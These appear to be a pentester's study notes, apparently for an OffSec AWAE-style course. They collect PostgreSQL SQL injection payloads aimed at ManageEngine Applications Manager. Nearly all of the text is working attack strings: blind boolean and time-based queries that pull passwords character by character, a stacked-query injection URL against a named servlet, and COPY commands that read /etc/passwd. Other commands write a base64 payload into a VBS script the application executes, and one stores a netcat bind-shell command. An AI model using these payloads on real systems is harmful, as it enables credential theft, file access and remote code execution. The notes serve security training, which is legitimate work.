# psql execution
```
psql -p 15432 -U postgres -d amdb  ; `appmanager`

```

# Payload

```
select convert_from(decode('QVdBRQ==', 'base64'), 'utf-8');

select+case+when(ascii(substr((select+content+from+awae),1,1))=104)+then+pg_sleep(2)

amdb=#SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);

CREATE TEMP TABLE AWAE(offsec text);INSERT INTO AWAE(offsec) VALUES ($test$);
COPY AWAE(offsec) TO $C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$;


python payload.py --target manageengine --sqli ';' --payload 'SELECT case when (SELECT current_setting($is_superuser$))=$on$ then pg_sleep(10) else pg_sleep(2) end;--' 


# Payload to copy files to a file. 

copy (select convert_from(decode($ENCODED_PAYLOAD$,$base64$),$utf-8$)) to $C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$;

copy (select convert_from(decode($QVdBRQ==$,$base64$),$utf-8$)) to $/test.txt$;

------

CREATE temp table awae (content text);
COPY awae from $c:\awae.txt$;
SELECT content from awae;
DROP table awae;



# Boolean, Expect the normal return if works. 
[] (SELECT+(CASE+WHEN+(1%3d1)+THEN+9999+ELSE+1/(SELECT+0)+END))--
[] (SELECT (CASE WHEN (1=1) THEN 999 ELSE 1/(SELECT 0) END))
[] order=(SELECT (CASE WHEN substring((SELECT datname FROM pg_database LIMIT 1),1,1)='p' THEN 1592 ELSE 1592/(SELECT 0) END))
[] order=(SELECT (CASE WHEN substring((SELECT password FROM users LIMIT 1 offset 0),1,1)='V' THEN 1592 ELSE 1592/(SELECT 0) END))--

```

# Time based vs boolean based
```

# Timebased
[] (SELECT 1 FROM PG_SLEEP(5))
[] (select+case+when(ascii(substr((select+password+from+users),1,1))=104)+then+pg_sleep(2))
[] SELECT case when(substr((select password from users LIMIT 1 offset 0 ),1,1)='V') THEN pg_sleep(2) END;
[] SELECT (case when(ascii(substr((select password from users LIMIT 1 offset 0),1,1))=86) THEN pg_sleep(2) else pg_sleep(0) END);



/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;create+temp+table+awae+(content+text);copy+awae+from+$c:\awae.txt$;select+case+when(ascii(substr((select+content+from+awae),1,1))=104)+then+pg_sleep(2)+end;--+
```

https://www.postgresql.org/docs/9.2/functions-string.html

https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection

https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md

https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL

https://medium.com/@V-Blaze/sql-injection-protecting-your-postgresql-database-ce8c0cc43685


# psql Stack!!
Stacked using case ..when..then..else. 
```
python payload.py --target manageengine --sqli ';' --payload 'SELECT case when (SELECT current_setting($is_superuser$))=$on$ then pg_sleep(10) else pg_sleep(2) end;--' 

```

# Log file location

```
\pgsql\data\amdb\postgresql.conf

```



# Psql instead of `'` use `$`
```
SELECT 'AWAE';
SELECT $AWAE$;
SELECT $TAG$AWAE$TAG$;
```

# psql File Read/Write
```
CREATE TABLE temp(t TEXT);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp limit 1 offset 0;


CREATE TABLE pentestlab (t TEXT);
INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');
SELECT * FROM pentestlab;
COPY pentestlab(t) TO '/tmp/pentestlab';

COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';


```



